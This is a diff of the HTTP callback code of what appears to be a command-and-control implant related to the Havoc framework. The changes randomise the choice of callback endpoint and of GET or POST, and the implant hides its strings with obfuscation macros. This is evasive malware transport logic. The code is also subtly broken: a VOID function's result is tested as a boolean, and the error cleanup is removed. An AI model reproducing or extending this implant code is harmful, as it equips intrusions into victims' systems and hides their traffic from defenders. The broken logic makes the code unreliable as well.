@@ -66,7 +66,7 @@ namespace Http {
         }
     }
 
-     VOID CreateRequestContext(_request_context* req_ctx) {
+     VOID CreateRequestContext(_request_context *req_ctx) {
         HEXANE
 
         const wchar_t *endpoint = { };
@@ -82,8 +82,7 @@ namespace Http {
         }
 
         if (Ctx->transport.http->endpoints) {
-            const auto n_endpoint = Utils::Random::RandomNumber32();
-            endpoint =  Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
+            RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);
 
             req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint) + 1) * sizeof(wchar_t)));
             x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
@@ -99,11 +98,6 @@ namespace Http {
         }
 
         defer:
-        if (ntstatus != ERROR_SUCCESS) {
-            if (req_ctx) {
-                x_free(req_ctx);
-            }
-        }
     }
 
     VOID CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {
@@ -177,20 +171,10 @@ namespace Http {
         defer:
     }
 
-    VOID SelectMethod(LPWSTR method) {
-        HEXANE
-
-        // todo: based method selection?
-        if (Utils::Random::RandomNumber32() % 2 == 0) {
-            method = OBFW(L"GET");
-        } else {
-            method = OBFW(L"POST");
-        }
-    }
-
     VOID HttpCallback(const _stream *const out, _stream **in) {
         HEXANE
         // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
+        // todo: reverting tokens during http operations
 
         _proxy_context proxy_ctx = { };
         _request_context req_ctx = { };
@@ -198,8 +182,12 @@ namespace Http {
         uint32_t status     = 0;
         uint32_t n_status   = sizeof(uint32_t);
 
-        // todo: reverting tokens during http operations
-        SelectMethod(Ctx->transport.http->method);
+        wchar_t *methods[] = {
+            OBFW(L"GET"),
+            OBFW(L"POST"),
+        };
+
+        RANDOM_SELECT(Ctx->transport.http->method, methods);
 
         if (
             !CreateRequestContext(&req_ctx) ||
